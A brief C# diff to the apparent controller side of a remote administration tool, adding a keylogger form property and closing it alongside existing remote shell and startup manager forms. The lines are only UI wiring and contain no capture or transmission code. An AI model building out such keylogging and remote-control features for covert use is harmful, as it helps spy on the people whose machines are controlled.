@@ -22,6 +22,7 @@ namespace xServer.Core
         public FrmShowMessagebox FrmSm { get; set; }
         public FrmRemoteShell FrmRs { get; set; }
         public FrmStartupManager FrmStm { get; set; }
+        public FrmKeylogger FrmKl { get; set; }
 
         public bool IsAuthenticated { get; set; }
         public bool LastDesktopSeen { get; set; }
@@ -56,6 +57,8 @@ namespace xServer.Core
                 FrmRs.Close();
             if (FrmStm != null)
                 FrmStm.Close();
+            if (FrmKl != null)
+                FrmKl.Close();
         }
     }
 }
